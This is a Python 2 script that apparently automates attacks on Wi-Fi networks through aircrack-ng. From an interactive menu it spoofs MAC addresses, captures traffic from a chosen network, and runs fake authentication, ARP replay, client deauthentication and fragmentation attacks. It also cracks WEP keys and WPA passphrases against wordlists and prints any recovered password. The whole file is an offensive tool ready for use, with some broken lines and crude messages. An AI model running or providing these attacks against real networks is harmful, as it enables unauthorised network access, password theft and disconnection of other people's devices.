#!/usr/bin/env python
import readline
import os
import time

def init(): 
   initlist= ';'.join(("service network-manager stop",
      "airmon-ng stop mon4",
      "airmon-ng stop mon3",
      "airmon-ng stop mon2",
      "airmon-ng stop mon1",
      "airmon-ng stop mon0",
      "airmon-ng stop "+interface,
      "ifconfig "+interface+" down",
      "airmon-ng start "+interface,
      "airmon-ng start "+interface,
      "ifconfig mon0 down",
      "ifconfig mon1 down",
      "macchanger -A mon0",
      "macchanger -A mon1",
      "ifconfig "+interface+" up",
      "ifconfig mon0 up",
      "ifconfig mon1 up"))
   os.system(initlist)
def macspoof():
   maclist= ';'.join(("ifconfig mon0 down",
      "macchanger -m "+spoofmac+" mon0",
      "ifconfig mon0 up",))
   os.system(maclist)
def macchange():
   macchlist= ';'.join(("ifconfig mon0 down",
#fix here!
      "ifconfig ",
      "macchanger -A mon0",
      "macchanger -A mon1",
      "ifconfig mon0 up",))
   os.system(macchlist)
def housekeeping():
   #back to normal
   houselist= ';'.join(("airmon-ng stop mon4",
      "airmon-ng stop mon3",
      "airmon-ng stop mon2",
      "airmon-ng stop mon1",
      "airmon-ng stop mon0",
      "airmon-ng stop "+interface,
      "service network-manager start"))
   os.system(houselist)
   os.sys.exit()

def scan():
   os.system("airodump-ng -t WEP -t WPA -t WPA1 -t WPA2 mon1")

def listen():
   print "airodump-ng -c "+channel+" --bssid "+bssid+" -w box/"+essid+" mon1"
   os.system("gnome-terminal -x airodump-ng -c "+channel+" --bssid "+bssid+" -w box/\""+essid+"\" mon1 &")

def fakeauth():
   fauth_success = "y"
   print "aireplay-ng -1 0 -a "+bssid+" -h "+station+" -e "+essid+" mon0"
   os.system("aireplay-ng -1 0 -a "+bssid+" -h "+station+" -e \""+essid+"\" mon0") 

def arpreplay():
   print "aireplay-ng -3 -b "+bssid+" -h "+station+" mon0"
   os.system("gnome-terminal -x aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &")

def deauthsome1():
   print "aireplay-ng -0 5 -a "+bssid+" -c "+target_station+" mon0"
   os.system("gnome-terminal -x aireplay-ng -0 5 -a "+bssid+" -c "+target_station+" mon0 &")

def WPA_PSK():
   print "aircrack-ng -w dics/password.lst -b "+bssid+" box/"+essid+"*.cap -l "+essid+"wpass.tkc"
   os.system("gnome-terminal -x aircrack-ng -w dics/"+essid+".lst -b "+bssid+" box/"+essid+"*.cap -l "+essid+"wpass.tkc")
   os.system("gnome-terminal -x aircrack-ng -w dics/password.lst -b "+bssid+" box/"+essid+"*.cap -l "+essid+"wpass.tkc")
   #wpa = open(bssid+'wpass.tkc')
   #print wpa.readlines("The wpa password is: ")
def aircrack():
   print "aircrack-ng -z -b "+bssid+" box/"+essid+"*cap -l "+essid+"wpass.tkc"
   os.system("gnome-terminal -x aircrack-ng -z -b "+bssid+" box/"+essid+"*cap -l "+essid+"wpass.tkc")

#the below code i'm just trying to print the password file content
def printpass():
   fileexist = os.path.isfile(essid+"wpass.tkc")
   print fileexist
   if fileexist == "True":
      passfile = essid+"wpass.tkc"  
      getpass = open(passfile)
      puspass = getpass.readlines(1)
      print "Your most recent password was:"
      print puspass
   else:
      print "No password yet"

def fragout():
   os.system ("gnome-terminal -x aireplay-ng -5 -b \""+bssid+"\" -h \""+station+"\" mon0")

#==========================qr==========================D

interface = "wlan0"
interface = raw_input("interface: ")
init()
scan()

# input target prefs
bssid = raw_input("bssid: ")
essid = raw_input("essid: ")
channel = raw_input("channel: ")
macshow = os.popen("macchanger -s mon0")
station = macshow.read()[13:30]

# starts listening for ivs
listen()

cont = "n"
while (cont == "n"): 
   listen_selection = raw_input("\n 0 Change Target\n 1 Fake-auth(FAST)\n 2 ARP Replay\n 3 Deauth Someone\n 4 Frag Attack\n 5 Aircrack\n 6 WPA PSK Crack\n 7 Print Pass\n 8 Quit\n\nplease pick a number: ")
   if listen_selection == "0":
      scan()
      # input target prefs
      bssid = raw_input("bssid: ")
      essid = raw_input("essid: ")
      channel = raw_input("channel: ")
      macshow = os.popen("macchanger -s mon0")
      station = macshow.read()[13:30]
      listen()	
   elif listen_selection == "1":
      fakeauth()
   elif listen_selection == "2":
      arpreplay()
   elif listen_selection == "3":
      target_station = raw_input("Input station target: ")
      deauthsome1()
   elif listen_selection == "4":
      fragout()
   elif listen_selection == "5":
      aircrack()
   elif listen_selection == "6":
      WPA_PSK()	
   elif listen_selection == "7":
      printpass()
   elif listen_selection == "8":
      print "cleaning up"
      housekeeping()
  # elif listen_selection == "9":
      
   elif listen_selection == "qr":
      print "Oh god dammit, fuck you"
      housekeeping()
   elif listen_selection == "spoof":
      spoofmac = raw_input("mac? ")
      macspoof()
      station = spoofmac 
   elif listen_selection == "quicky":
      print "performing quickie"
      fakeauth()
      arpreplay()
   else:
      print ">:("
	
print "I'm out biatch"
